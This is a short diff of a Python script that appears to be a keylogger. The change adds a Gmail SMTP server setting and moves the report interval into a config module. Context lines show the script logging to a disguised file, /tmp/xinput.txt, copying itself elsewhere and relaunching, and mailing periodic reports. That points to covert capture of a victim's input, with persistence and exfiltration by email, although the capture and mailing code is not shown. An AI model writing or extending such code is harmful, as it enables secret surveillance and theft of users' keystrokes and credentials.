@@ -7,7 +7,8 @@ from email.MIMEText import MIMEText
 from time import sleep
 from subprocess import Popen, PIPE, check_output
 
-SLEEP_INTERVAL = 30
+EMAIL_SERVER = "smtp.gmail.com"
+
 LOG_FILE = "/tmp/xinput.txt"
 
 HOME_DIRECTORY = os.path.expanduser('~')
@@ -81,4 +82,4 @@ if current_file != destination_file:
 	Popen(destination_file)
 else:
 	start_logging(LOG_FILE)
-	send_mail_reports_every(SLEEP_INTERVAL)
+	send_mail_reports_every(config.SLEEP_INTERVAL)
